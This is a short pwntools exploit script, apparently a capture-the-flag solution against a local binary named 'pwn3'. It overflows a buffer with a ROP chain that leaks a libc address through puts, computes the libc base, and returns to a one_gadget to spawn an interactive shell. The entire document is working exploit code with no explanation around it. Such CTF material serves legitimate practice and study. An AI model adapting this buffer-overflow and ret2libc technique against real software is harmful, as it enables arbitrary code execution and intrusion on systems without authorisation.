from pwn import *

elf = ELF('./pwn3')
#libc = ELF('libc.so.6') #題目給的
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') #本地測試

context(arch = 'amd64',log_level='debug')
r = process('./pwn3')

offset = 'a'*0x10
pop_rdi_ret = 0x4006d3
one_gadget = 0xf1147

payload = flat([
                offset,
                pop_rdi_ret,
                elf.got['__libc_start_main'],
                elf.plt['puts'],
                elf.symbols['main']
                ])
r.sendline(payload)
r.recvline()

payload2 = flat([
                offset,
                u64(r.recv(6)+'\x00\x00') - libc.symbols['__libc_start_main'] + one_gadget
                ])

r.sendline(payload2)
r.interactive()
